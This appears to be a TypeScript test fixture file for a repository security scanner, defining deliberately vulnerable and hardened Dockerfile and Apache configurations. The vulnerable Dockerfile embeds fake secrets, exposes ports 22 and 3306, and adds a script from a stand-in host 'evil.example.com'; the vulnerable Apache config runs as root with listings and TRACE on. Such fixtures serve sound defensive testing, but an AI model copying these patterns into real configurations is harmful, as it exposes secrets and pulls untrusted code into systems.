import type { ScanRecord } from "../../src/lib/types";
import { initialStages } from "../../src/lib/pipeline/orchestrator";

// 데모용 취약/안전 레포를 그대로 테스트 픽스처로 재사용한다 (spec: prior art = fixture).
export const VULN_TOKEN = "ghp_FAKE0123456789abcdefghijklmnopqrst";

export const VULN_DOCKERFILE = [
  "FROM ubuntu:latest",
  "ENV API_KEY=supersecret123",
  `ENV GITHUB_TOKEN=${VULN_TOKEN}`,
  "EXPOSE 22 3306",
  "ADD https://evil.example.com/x.sh /x.sh",
  'CMD ["sleep", "300"]',
].join("\n");

export const SAFE_DOCKERFILE = [
  "FROM debian:12.5",
  "RUN useradd -r app",
  "USER app",
  "HEALTHCHECK CMD true",
  "EXPOSE 8080",
  'CMD ["sleep", "300"]',
].join("\n");

// Apache httpd 설정 픽스처 (Slice 5)
export const VULN_APACHE = [
  "User root",
  '<Directory "/usr/local/apache2/htdocs">',
  "  Options Indexes FollowSymLinks",
  "</Directory>",
  "TraceEnable On",
].join("\n"); // CustomLog/ErrorDocument/ServerTokens Prod/ServerSignature Off 없음

export const SAFE_APACHE = [
  "User www-data",
  "ServerTokens Prod",
  "ServerSignature Off",
  "TraceEnable Off",
  "ErrorDocument 404 /404.html",
  "CustomLog /var/log/apache2/access.log combined",
  '<Directory "/usr/local/apache2/htdocs">',
  "  Options -Indexes FollowSymLinks",
  "  <LimitExcept GET POST>",
  "    Require all denied",
  "  </LimitExcept>",
  "</Directory>",
].join("\n");

export function makeScan(id: string, repoUrl = "https://example.com/repo.git"): ScanRecord {
  const now = new Date().toISOString();
  return {
    id,
    repoUrl,
    createdAt: now,
    updatedAt: now,
    status: "running",
    executor: "stub",
    usedLocalImageFallback: false,
    stages: initialStages(),
    results: [],
  };
}

// 인메모리 store: saveScan 호출 시점의 스냅샷을 보관한다.
export function memStore() {
  const saved = new Map<string, ScanRecord>();
  return {
    saveScan: async (s: ScanRecord) => {
      saved.set(s.id, structuredClone(s));
    },
    get: (id: string) => saved.get(id),
  };
}
